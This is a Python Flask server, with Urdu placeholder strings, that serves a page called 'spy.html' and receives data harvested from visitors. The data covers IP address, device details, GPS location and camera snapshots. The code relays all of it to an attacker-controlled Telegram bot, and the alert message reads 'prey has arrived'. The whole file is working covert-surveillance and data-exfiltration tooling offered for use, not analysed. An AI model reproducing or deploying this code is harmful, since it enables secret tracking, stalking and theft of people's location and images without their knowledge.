from flask import Flask, request, render_template
import requests, base64, os

app = Flask(__name__, template_folder='templates', static_folder='static')

BOT_TOKEN = "آپ_کا_ٹیلگرام_بوٹ_ٹوکن"
CHAT_ID = "آپ_کا_چیٹ_ID"

@app.route('/')
def index():
    return render_template("spy.html")

@app.route('/collect', methods=['POST'])
def collect():
    data = request.json
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    ua = data.get('userAgent', 'Unknown')
    lat = data.get('latitude')
    lon = data.get('longitude')
    camera = data.get('camera', 'Unknown')
    device = data.get('deviceInfo', 'Unknown')
    location = f"https://www.google.com/maps?q={lat},{lon}" if lat and lon else "❌ Location Not Available"

    message = f"""
👁️ شکار آیا!
🌐 IP Address: {ip}
📱 Device: {ua}
📍 Location: {location}
📷 Camera: {camera}
🧠 Device Info: {device}
    """

    # Send text
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    requests.post(url, data={'chat_id': CHAT_ID, 'text': message})

    # Send image if available
    snapshot = data.get("snapshot")
    if snapshot:
        image_data = snapshot.split(",")[1]
        file_path = "static/snap.png"
        with open(file_path, "wb") as f:
            f.write(base64.b64decode(image_data))

        photo_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
        with open(file_path, "rb") as photo:
            requests.post(photo_url, data={"chat_id": CHAT_ID}, files={"photo": photo})

    return "OK", 200

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
